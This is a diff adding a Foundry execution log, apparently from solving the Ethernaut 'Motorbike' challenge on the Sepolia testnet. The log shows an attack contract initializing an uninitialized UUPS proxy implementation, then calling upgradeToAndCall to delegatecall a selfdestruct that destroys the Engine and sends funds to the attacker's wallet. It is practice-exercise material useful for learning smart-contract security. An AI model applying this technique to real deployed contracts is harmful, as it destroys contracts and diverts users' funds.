@@ -1,0 +1,88 @@
+Traces:
+  [406880] Exploit::run()
+    ├─ [0] VM::startBroadcast()
+    │   └─ ← [Return]
+    ├─ [0] console::log("Operator (msg.sender):", 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::load(0x785050064EC789834656622689Ca07785265020b, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc) [staticcall] 
+    │   └─ ← [Return] 0x000000000000000000000000e727fbc2605104998a6b6c19426cf8698d200c83
+    ├─ [0] console::log("Engine Address to be destroyed:", 0xe727FBC2605104998a6b6c19426cF8698d200C83) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [284951] → new MotorbikeAttack@0x7dE290d306332e4deD4823D9301EEe6cfd49B8f4
+    │   └─ ← [Return] 1421 bytes of code
+    ├─ [80086] MotorbikeAttack::attack()
+    │   ├─ [45484] 0xe727FBC2605104998a6b6c19426cF8698d200C83::initialize()
+    │   │   └─ ← [Stop]
+    │   ├─ [0] console::log("Attacking from wallet (tx.origin):", 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d) [staticcall]
+    │   │   └─ ← [Stop]
+    │   ├─ [29631] 0xe727FBC2605104998a6b6c19426cF8698d200C83::upgradeToAndCall(MotorbikeAttack: [0x7dE290d306332e4deD4823D9301EEe6cfd49B8f4], 0x41c0e1b5)
+    │   │   ├─ [6130] MotorbikeAttack::kill() [delegatecall]
+    │   │   │   ├─ [0] console::log("Selfdestructing Engine... Sending funds to:", 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d) [staticcall]      
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [SelfDestruct]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+== Logs ==
+  Operator (msg.sender): 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d
+  Engine Address to be destroyed: 0xe727FBC2605104998a6b6c19426cF8698d200C83
+  Attacking from wallet (tx.origin): 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d
+  Selfdestructing Engine... Sending funds to: 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [284951] → new MotorbikeAttack@0x7dE290d306332e4deD4823D9301EEe6cfd49B8f4
+    └─ ← [Return] 1421 bytes of code
+
+  [82586] MotorbikeAttack::attack()
+    ├─ [45484] 0xe727FBC2605104998a6b6c19426cF8698d200C83::initialize()
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attacking from wallet (tx.origin):", 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [29631] 0xe727FBC2605104998a6b6c19426cF8698d200C83::upgradeToAndCall(MotorbikeAttack: [0x7dE290d306332e4deD4823D9301EEe6cfd49B8f4], 0x41c0e1b5)
+    │   ├─ [6130] MotorbikeAttack::kill() [delegatecall]
+    │   │   ├─ [0] console::log("Selfdestructing Engine... Sending funds to:", 0xF65A19dA51aa18aa518BbaFEC5CE771f107E528d) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [SelfDestruct]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 11155111
+
+Estimated gas price: 0.001000018 gwei
+
+Estimated total gas used for script: 623639
+
+Estimated amount required: 0.000000623650225502 ETH
+
+==========================
+
+##### sepolia
+✅  [Success] Hash: 0x688901b1bfb049a54ab82f5f80053622d84b13a3bd64722171ad35f1fb4c92c9
+Contract Address: 0x7dE290d306332e4deD4823D9301EEe6cfd49B8f4
+Block: 9996214
+Paid: 0.000000363120268053 ETH (363117 gas * 0.001000009 gwei)
+
+
+##### sepolia
+✅  [Success] Hash: 0xf678917bb65af23992e7fa7528c3801757b2bf99996a794f8de7a1cc96f43105
+Block: 9996214
+Paid: 0.00000010365093285 ETH (103650 gas * 0.001000009 gwei)
+
+✅ Sequence #1 on sepolia | Total Paid: 0.000000466771200903 ETH (466767 gas * avg 0.001000009 gwei)
+
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
